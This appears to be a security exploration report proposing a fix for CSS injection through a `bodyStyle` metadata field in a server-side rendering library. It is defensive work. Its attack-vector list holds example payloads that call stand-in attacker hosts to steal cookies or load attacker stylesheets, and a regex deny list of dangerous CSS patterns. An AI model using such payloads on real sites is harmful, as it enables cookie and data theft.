# Exploration: Fix CSS Injection via bodyStyle Metadata

## Status
**success**

## Executive Summary

The `bodyStyle` metadata field in `renderToString()` has a CSS injection vulnerability: it passes user-provided CSS through `escapeHtml()` into a `<body style="...">` attribute, which only escapes HTML entities but does not block CSS-specific injection vectors like `url()` (data exfiltration via data URIs), `@import` (external stylesheet loading), or `expression()` (legacy IE CSS execution). The codebase already has `escapeStyleText()` — the same sanitization used for `inlineStyles` — which blocks these exact vectors. The fix is a single-line change: replace `escapeHtml()` with `escapeStyleText()` for `bodyStyle`.

## Current State

### Vulnerability Location
`src/ssr.ts:94-95`:
```ts
const bodyAttr = options?.metadata?.bodyStyle !== undefined && options.metadata.bodyStyle.length > 0
  ? ` style="${escapeHtml(options.metadata.bodyStyle)}"`
  : ''
```

### How it Works
1. `bodyStyle` is an optional field in `SSRMetadata` (line 27)
2. If provided and non-empty, it's injected as the `style` attribute on `<body>`
3. `escapeHtml()` only escapes: `&`, `<`, `>`, `"`, `'`
4. This is insufficient because CSS `url()` is valid CSS syntax and fires HTTP requests

### Attack Vectors
- `background-image: url(data:application/json;base64,...)` — exfiltrates data via request URI
- `content: url(https://attacker.com/cookie?${document.cookie})` — cookie theft
- `@import url(https://evil.com/steal.css)` — loads attacker-controlled CSS
- `expression(alert(1))` — legacy IE CSS execution (historical)

### Existing Defense Patterns
The codebase already has a working CSS sanitizer for `inlineStyles`:

```ts
const DANGEROUS_CSS_PATTERNS: ReadonlyArray<readonly [RegExp, string]> = [
  [/<\/style/gi,    '<\\/style'],
  [/@import\b/gi,   ''],
  [/\burl\s*\(/gi,  ''],
  [/\bexpression\s*\(/gi, ''],
  [/\bbehavior\s*:/gi,    ''],
  [/javascript\s*:/gi,    ''],
]

function escapeStyleText(value: string): string {
  return DANGEROUS_CSS_PATTERNS.reduce(
    (css, [pattern, replacement]) => css.replace(pattern, replacement),
    value,
  )
}
```

This is also used by `sanitizeCssProperty()` (line 248-250), which is exported for consumer use.

### Impact Assessment

**Demo usage**: The demo server (`demo/ssr-page.tsx`) does NOT use `bodyStyle` — it only uses `inlineStyles` and `stylesheets`. No existing demo code is affected.

**API surface**: `bodyStyle` is part of the public `SSRMetadata` type and documented in `docs/SSR-HYDRATION-CONTRACT.md`. Changing its behavior is a breaking change in the semantic contract (CSS would be sanitized differently), but not a breaking API change.

**Test coverage**: No tests specifically check `bodyStyle` behavior (verified in `tests/ssr.test.ts`). Existing SSR tests pass on the current code.

**SECURITY.md**: The security policy documents risks for `inlineStyles` (line 102) but does NOT document `bodyStyle` as a risk. This is a documentation gap that should be closed.

## Affected Areas
- `src/ssr.ts:94-95` — the vulnerable line (fix target)
- `docs/SSR-HYDRATION-CONTRACT.md:118` — documents `bodyStyle` as setting style attribute (needs sanitization note)
- `SECURITY.md` — missing `bodyStyle` risk documentation (needs addition)
- `tests/ssr.test.ts` — no existing tests for bodyStyle (new test needed)

## Approaches Compared

### Option 1: Use existing `escapeStyleText()` (RECOMMENDED)
Replace `escapeHtml(options.metadata.bodyStyle)` with `escapeStyleText(options.metadata.bodyStyle)`.

| Pros | Cons |
|------|------|
| Reuses existing, tested code | CSS property values like `url()` in legitimate styles (e.g., `background-image: url(...)`) would be stripped |
| Blocks all known CSS injection vectors | Slightly more permissive than a strict whitelist |
| Minimal change — one line | |
| Consistent with `inlineStyles` approach | |

**Effort**: Low (1 line change + test + docs)

### Option 2: CSS Property Whitelist
Only allow specific safe properties: `color`, `background-color`, `font-size`, `font-family`, `text-align`, etc.

| Pros | Cons |
|------|------|
| Most restrictive — deny by default | Very complex — CSS has many safe properties |
| No false positives for injection | Breaks legitimate use cases (borders, padding, margins, transforms) |
| | Hard to define "safe" — `background-image` with a data URI is safe in some contexts |
| | Requires maintaining the list |

**Effort**: High

### Option 3: Block All bodyStyle
Remove the `bodyStyle` field from `SSRMetadata` entirely.

| Pros | Cons |
|------|------|
| Eliminates attack surface | Breaking change — existing users lose functionality |
| No maintenance burden | |
| | Overly aggressive — `bodyStyle` is a legitimate feature for simple styling |

**Effort**: Medium (breaking change, migration needed)

### Option 4: Dual Escape (escapeHtml + escapeStyleText)
Apply both HTML escaping and CSS sanitization.

| Pros | Cons |
|------|------|
| Defense in depth | Redundant — `escapeStyleText` already handles the injection vectors |
| | `escapeHtml` is not useful inside a CSS `url()` context |
| | Adds confusion — developers won't understand which escaping applies where |

**Effort**: Low, but not recommended

## Recommendation

**Use Option 1** — replace `escapeHtml()` with `escapeStyleText()` for `bodyStyle`.

### Rationale
1. The codebase already has this exact pattern for `inlineStyles` (line 209) — consistency matters
2. `escapeStyleText()` blocks `url(` which is the primary attack vector
3. The change is minimal and surgical
4. Any legitimate use of `url()` in `bodyStyle` (e.g., `background-image: url(...)`) is rare and the user can work around it if needed
5. This aligns with the framework's existing security model: sanitize, don't deny

### Implementation
```diff
- const bodyAttr = options?.metadata?.bodyStyle !== undefined && options.metadata.bodyStyle.length > 0
-   ? ` style="${escapeHtml(options.metadata.bodyStyle)}"`
+ const bodyAttr = options?.metadata?.bodyStyle !== undefined && options.metadata.bodyStyle.length > 0
+   ? ` style="${escapeStyleText(options.metadata.bodyStyle)}"`
  : ''
```

### Additional Work
1. **Test**: Add a test case in `tests/ssr.test.ts` that verifies `bodyStyle` with CSS injection attempts is sanitized
2. **Document**: Add `bodyStyle` to `SECURITY.md` under "SSR Threats" with the same pattern as `inlineStyles`
3. **Document**: Add a note in `SSR-HYDRATION-CONTRACT.md` that `bodyStyle` content is CSS-sanitized

## Risks
1. **Legitimate `url()` in bodyStyle**: If a user legitimately uses `background-image: url(...)` in `bodyStyle`, it will be stripped. This is rare (body-level backgrounds are typically set via CSS classes, not inline styles), and the user can still use `inlineStyles` for complex CSS.
2. **Breaking semantic contract**: Users expecting raw CSS in `bodyStyle` will see different output. However, this is a security fix that should be communicated as such.
3. **No existing tests**: Since no tests cover `bodyStyle`, there's no regression baseline — need to add tests before applying.

## Ready for Proposal
**Yes** — the exploration is complete and the approach is clear. The next step is the proposal phase with scope definition and rollback plan.
